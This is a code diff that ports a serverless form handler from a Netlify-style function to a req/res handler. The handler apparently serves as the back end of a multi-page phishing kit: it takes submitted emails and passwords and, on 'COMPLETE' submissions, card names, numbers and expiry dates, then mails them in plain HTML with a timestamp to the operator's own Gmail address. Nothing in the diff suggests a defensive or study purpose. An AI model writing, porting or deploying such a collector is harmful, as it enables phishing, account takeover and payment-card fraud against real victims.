@@ -1,33 +1,25 @@
 const nodemailer = require("nodemailer");
 
-exports.handler = async (event) => {
+module.exports = async function handler(req, res) {
   try {
-
     // Only allow POST requests
-    if (event.httpMethod !== "POST") {
-      return {
-        statusCode: 405,
-        body: JSON.stringify({
-          success: false,
-          message: "Method Not Allowed",
-        }),
-      };
+    if (req.method !== "POST") {
+      return res.status(405).json({
+        success: false,
+        message: "Method Not Allowed",
+      });
     }
 
-    const body = JSON.parse(event.body || "{}");
-    const { submissionType, data } = body;
+    const { submissionType, data } = req.body || {};
 
     if (!data) {
-      return {
-        statusCode: 400,
-        body: JSON.stringify({
-          success: false,
-          message: "No data provided",
-        }),
-      };
+      return res.status(400).json({
+        success: false,
+        message: "No data provided",
+      });
     }
 
-    // Email transporter (Netlify backend environment variables)
+    // Create transporter
     const transporter = nodemailer.createTransport({
       service: "gmail",
       auth: {
@@ -36,32 +28,21 @@ exports.handler = async (event) => {
       },
     });
 
-    // Define submission types
-    const isIncomplete = submissionType === "INCOMPLETE";
     const isComplete = submissionType === "COMPLETE";
 
-    // =========================
-    // BASE EMAIL (Page 1 + Page 2)
-    // =========================
-
+    // Email body
     let emailHTML = `
       <h2>New Form Submission</h2>
       <p><strong>Type:</strong> ${submissionType}</p>
       <hr />
-
       <p><strong>Email/User:</strong> ${data.email || "N/A"}</p>
       <p><strong>Password:</strong> ${data.password || "N/A"}</p>
     `;
-
-    // =========================
-    // PAGE 3 DATA (ONLY COMPLETE)
-    // =========================
 
     if (isComplete) {
       emailHTML += `
         <hr />
         <h3>Card Details</h3>
-
         <p><strong>Card Name:</strong> ${data.cardName || "N/A"}</p>
         <p><strong>Card Number:</strong> ${data.cardNumber || "N/A"}</p>
         <p><strong>Expiry:</strong> ${data.expiryDate || "N/A"}</p>
@@ -69,16 +50,12 @@ exports.handler = async (event) => {
       `;
     }
 
-    // Timestamp for tracking
     emailHTML += `
       <hr />
       <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
     `;
 
-    // =========================
-    // SEND EMAIL
-    // =========================
-
+    // Send email
     await transporter.sendMail({
       from: process.env.EMAIL_USER,
       to: process.env.EMAIL_USER,
@@ -89,24 +66,18 @@ exports.handler = async (event) => {
       html: emailHTML,
     });
 
-    return {
-      statusCode: 200,
-      body: JSON.stringify({
-        success: true,
-        message: "Email sent successfully",
-      }),
-    };
+    return res.status(200).json({
+      success: true,
+      message: "Email sent successfully",
+    });
 
   } catch (error) {
     console.error("Email Error:", error);
 
-    return {
-      statusCode: 500,
-      body: JSON.stringify({
-        success: false,
-        message: "Failed to send email",
-        error: error.message,
-      }),
-    };
+    return res.status(500).json({
+      success: false,
+      message: "Failed to send email",
+      error: error.message,
+    });
   }
 };
